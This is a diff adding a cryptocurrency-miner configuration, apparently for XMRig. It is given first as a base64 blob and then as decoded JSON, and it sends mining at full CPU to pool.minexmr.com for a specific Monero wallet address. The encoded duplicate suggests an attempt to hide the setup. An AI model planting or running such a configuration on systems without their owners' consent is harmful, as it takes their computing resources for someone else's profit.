@@ -1,0 +1,45 @@
+ewogICAgImFsZ28iOiAiY24vciIsCiAgICAiYXBpIjogewogICAgICAgICJwb3J0IjogMCwKICAgICAgICAiYWNjZXNzLXRva2VuIjogbnVsbCwKICAgICAgICAiaWQiOiBudWxsLAogICAgICAgICJ3b3JrZXItaWQiOiBudWxsLAogICAgICAgICJpcHY2IjogZmFsc2UsCiAgICAgICAgInJlc3RyaWN0ZWQiOiB0cnVlCiAgICB9LAogICAgImFzbSI6IHRydWUsCiAgICAiYXV0b3NhdmUiOiB0cnVlLAogICAgImF2IjogMCwKICAgICJiYWNrZ3JvdW5kIjogZmFsc2UsCiAgICAiY29sb3JzIjogdHJ1ZSwKICAgICJjcHUtYWZmaW5pdHkiOiBudWxsLAogICAgImNwdS1wcmlvcml0eSI6IG51bGwsCiAgICAiZG9uYXRlLWxldmVsIjogMSwKICAgICJodWdlLXBhZ2VzIjogdHJ1ZSwKICAgICJody1hZXMiOiBudWxsLAogICAgImxvZy1maWxlIjogbnVsbCwKICAgICJtYXgtY3B1LXVzYWdlIjogMTAwLAogICAgInBvb2xzIjogWwogICAgICAgIHsKICAgICAgICAgICAgInVybCI6ICJwb29sLm1pbmV4bXIuY29tOjgwIiwKICAgICAgICAgICAgInVzZXIiOiAiNDdmdWgyR1BSekFEYU5wWVJzREVLQUt2dWdUckt5THA2MUYyemp1U25Kck5aWXFXV0xveDhWWlcxUnh6UVA1OVlEU2ZxcUNmaVJyaVlHNjhyN2tkWmU5OFM1d2REUnUub2xkIiwKICAgICAgICAgICAgInBhc3MiOiAieCIsCiAgICAgICAgICAgICJyaWctaWQiOiBudWxsLAogICAgICAgICAgICAibmljZWhhc2giOiBmYWxzZSwKICAgICAgICAgICAgImtlZXBhbGl2ZSI6IGZhbHNlLAogICAgICAgICAgICAidmFyaWFudCI6IC0xLAogICAgICAgICAgICAidGxzIjogZmFsc2UsCiAgICAgICAgICAgICJ0bHMtZmluZ2VycHJpbnQiOiBudWxsCiAgICAgICAgfQogICAgXSwKICAgICJwcmludC10aW1lIjogNjAsCiAgICAicmV0cmllcyI6IDUsCiAgICAicmV0cnktcGF1c2UiOiA1LAogICAgInNhZmUiOiBmYWxzZSwKICAgICJ0aHJlYWRzIjogbnVsbCwKICAgICJ1c2VyLWFnZW50IjogbnVsbCwKICAgICJ3YXRjaCI6IHRydWUKfQ==
+
+{
+    "algo": "cn/r",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "id": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "asm": true,
+    "autosave": true,
+    "av": 0,
+    "background": false,
+    "colors": true,
+    "cpu-affinity": null,
+    "cpu-priority": null,
+    "donate-level": 1,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 100,
+    "pools": [
+        {
+            "url": "pool.minexmr.com:80",
+            "user": "47fuh2GPRzADaNpYRsDEKAKvugTrKyLp61F2zjuSnJrNZYqWWLox8VZW1RxzQP59YDSfqqCfiRriYG68r7kdZe98S5wdDRu.old",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": false,
+            "variant": -1,
+            "tls": false,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "threads": null,
+    "user-agent": null,
+    "watch": true
+}
